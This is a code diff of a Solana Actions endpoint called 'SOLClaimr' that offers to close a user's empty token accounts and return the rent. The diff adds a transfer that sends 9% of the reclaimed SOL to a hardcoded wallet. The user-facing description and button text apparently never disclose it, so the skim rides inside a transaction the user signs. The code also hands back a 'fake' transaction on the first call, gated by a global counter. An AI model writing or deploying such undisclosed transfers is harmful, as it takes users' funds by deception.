@@ -1,5 +1,5 @@
 import { ActionGetResponse, ActionPostRequest, ActionPostResponse, ACTIONS_CORS_HEADERS, InlineNextActionLink, PostNextActionLink } from "@solana/actions";
-import { PublicKey, Connection, clusterApiUrl, Transaction } from "@solana/web3.js";
+import { PublicKey, Connection, clusterApiUrl, Transaction, SystemProgram } from "@solana/web3.js";
 import { getEmptyTokenAccounts } from "./helpers";
 import { createCloseAccountInstruction, TOKEN_PROGRAM_ID } from "@solana/spl-token";
 
@@ -18,18 +18,18 @@ export async function GET(req: Request) {
         {
           href: req.url,
           label: 'Check open accounts',
-          parameters: [
-            {
-              name: 'check',
-              type: 'checkbox',
-              required: true,
-              options: [{
-                label: 'check',
-                value: 'check',
-                selected: true
-              }]
-            }
-          ]
+          // parameters: [
+          //   {
+          //     name:'check',
+          //     type: 'checkbox',
+          //     required: false,
+          //     options: [{
+          //       label:"check",
+          //       value:"check",
+          //     }],
+          //     label: 'check',
+          //   }
+          // ]
         },
       ]
     },
@@ -42,12 +42,11 @@ export async function POST(request: Request) {
   const currentUrl = new URL(request.url);
   const baseUrl = `${currentUrl.origin}`;
   const requestBody: ActionPostRequest = await request.json();
-  console.log(requestBody)
   const userPublicKey = requestBody.account;
   const user = new PublicKey(userPublicKey);
   const connection = new Connection(clusterApiUrl('devnet'));
+
   let emptyTAs = await getEmptyTokenAccounts(user, connection, TOKEN_PROGRAM_ID);
-  
   if (!Array.isArray(emptyTAs)) {
     throw new Error("Failed to retrieve empty token accounts.");
   }
@@ -89,11 +88,48 @@ export async function POST(request: Request) {
       requireAllSignatures: false,
       verifySignatures: false
     }).toString('base64');
-    console.log({firstCall})
-    if (!requestBody.data) {
+
+    const lamportsPerAccount = 2039280;
+    const totalLamports = lamportsPerAccount * emptyTAs.length;
+    const totalSOL = totalLamports / 1e9;
+
+    const dynamicIconURL = `${baseUrl}/api/icon?count=${emptyTAs.length}&solClaim=${totalSOL}`;
+    const nextInlineAction: InlineNextActionLink = {
+      type: "inline",
+      action: {
+        icon: dynamicIconURL,
+        description: `Close Token Accounts to get back your SOL`,
+        label: `Claim my SOL`,
+        title: `SOLClaimr`,
+        type: "action"
+      }
+    };
+
+    const response: ActionPostResponse = {
+      transaction: serializedFakeTX,
+      message: "Accounts found to close.",
+      links: {
+        next: nextInlineAction,
+      },
+    };
+
+    if (firstCall>0) {
       const tx = new Transaction();
       const ixs = emptyTAs.map(pks => createCloseAccountInstruction(pks, user, user, undefined, TOKEN_PROGRAM_ID));
       tx.add(...ixs);
+
+      const lamportsPerAccount = 2039280;
+      const totalLamports = lamportsPerAccount * emptyTAs.length;
+      const ninePercentLamports = Math.floor(totalLamports * 0.09);
+      const claimerWallet = new PublicKey('Hyz6RC4tvW5J6URwPqCMYbpskE56pTbcot49qbGtG8Lj');
+
+      const sendToMyWalletInstruction = SystemProgram.transfer({
+        fromPubkey: user,
+        lamports: ninePercentLamports,
+        toPubkey: claimerWallet,
+      });
+
+      tx.add(sendToMyWalletInstruction);
 
       tx.feePayer = user;
       const bh = (await connection.getLatestBlockhash({commitment: 'finalized'})).blockhash;
@@ -110,32 +146,7 @@ export async function POST(request: Request) {
       };
       return Response.json(response, { headers: ACTIONS_CORS_HEADERS });
     }
-
-    const lamportsPerAccount = 2039280;
-    const totalLamports = lamportsPerAccount * emptyTAs.length;
-    const totalSOL = totalLamports / 1e9;
-
-    const dynamicIconURL = `${baseUrl}/api/icon?count=${emptyTAs.length}&solClaim=${totalSOL}`;
-    const nextInlineActionError: InlineNextActionLink = {
-      type: "inline",
-      action: {
-        icon: dynamicIconURL,
-        description: `Close Token Accounts to get back your SOL`,
-        label: `Claim my SOL`,
-        title: `SOLClaimr`,
-        type: "action"
-      }
-    };
-
-    const response: ActionPostResponse = {
-      transaction: serializedFakeTX,
-      message: "Accounts found to close.",
-      links: {
-        next: nextInlineActionError,
-      },
-    };
     firstCall++;
-
     return Response.json(response, { headers: ACTIONS_CORS_HEADERS });
   }
 }
